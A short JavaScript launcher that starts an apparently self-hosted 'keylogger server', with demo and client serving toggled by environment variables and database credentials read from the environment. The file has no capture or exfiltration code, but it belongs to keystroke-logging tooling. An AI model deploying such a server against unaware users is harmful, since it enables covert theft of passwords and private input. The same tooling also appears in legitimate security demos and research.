/**
 * Starts a new keylogger server with user defined options
 */
const keyloggerServer = require('../main');
keyloggerServer({
  serveDemo: process.env.SERVEDEMO || false,
  serveClient: process.env.SERVECLIENT || false,
  database: {
    hostname: 'db',
    username: process.env.DBUSER,
    password: process.env.DBPASS,
    name: process.env.DBNAME
  }
});
